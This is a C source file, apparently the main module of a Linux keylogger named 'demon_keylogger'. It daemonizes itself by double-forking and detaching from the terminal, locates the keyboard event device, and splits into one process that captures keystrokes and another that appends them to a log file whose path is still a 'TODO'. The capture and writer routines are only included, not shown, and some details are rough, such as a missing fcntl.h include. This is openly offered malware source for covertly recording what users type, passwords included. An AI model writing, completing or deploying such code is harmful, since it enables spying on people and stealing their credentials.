#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syslog.h>

#include "find_event_file.h"
#include "keylogger.h"
#include "file_writer.h"

pid_t midPpid;

void parent_handler(int sig) {
    printf("Daemon created");
}

void mid_parent_handler(int sig) {
    kill(midPpid, SIGINT);
}

void start_daemon() {
    pid_t pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0) {
        struct sigaction handler;
        handler.sa_handler = &parent_handler;
        sigaction(SIGINT, &handler, NULL);
        printf("Paused\n");
        pause();
        exit(EXIT_SUCCESS);
    }

    // Now we are in the child process
    sleep(1);

    if (setsid() < 0)
        exit(EXIT_FAILURE);

    pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    if (pid > 0) {
        midPpid = getppid();
        struct sigaction handler;
        handler.sa_handler = &mid_parent_handler;
        sigaction(SIGINT, &handler, NULL);
        pause();
        exit(EXIT_SUCCESS);
    }

    // Now we are in the daemon process
    sleep(1);

    umask(S_IRUSR | S_IWUSR);
    //chdir("/");

    // Close all open file descriptors
    for (int fd = (int)sysconf(_SC_OPEN_MAX); fd >= 0; fd--) {
        close(fd);
    }

    kill(getppid(), SIGINT);

    // Open the log file
    openlog("demon_keylogger", LOG_PID, LOG_DAEMON);
    syslog(LOG_INFO, "Daemon started");
}

int main() {
    start_daemon();

    char *kbFilePath = get_keyboard_event_file();
    char *outFilePath = "TODO";

    int pipeFd[2];
    int keyboardFd;
    int outFd;

    if (pipe(pipeFd) < 0) {
        syslog(LOG_CRIT, "Error creating pipe: %m");
        return 1;
    }

    if (kbFilePath == NULL) {
        syslog(LOG_CRIT, "Couldn't find keyboard event file");
        exit(EXIT_FAILURE);
    }
    keyboardFd = open(kbFilePath, O_RDONLY);

    if ((outFd = open(outFilePath, O_WRONLY | O_APPEND | O_CREAT, S_IROTH)) < 0) {
        syslog(LOG_CRIT, "Error opening output file: %m");
        exit(EXIT_FAILURE);
    }

    pid_t pid = fork();

    if (pid < 0) {
        syslog(LOG_CRIT, "fork: %m");
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        // Keylogger process
        close(pipeFd[0]);
        keylogger(keyboardFd, pipeFd[1]);
    } else {
        // Writer process
        close(pipeFd[1]);
        file_writer(pipeFd[0], outFd);
    }

    return 0;
}
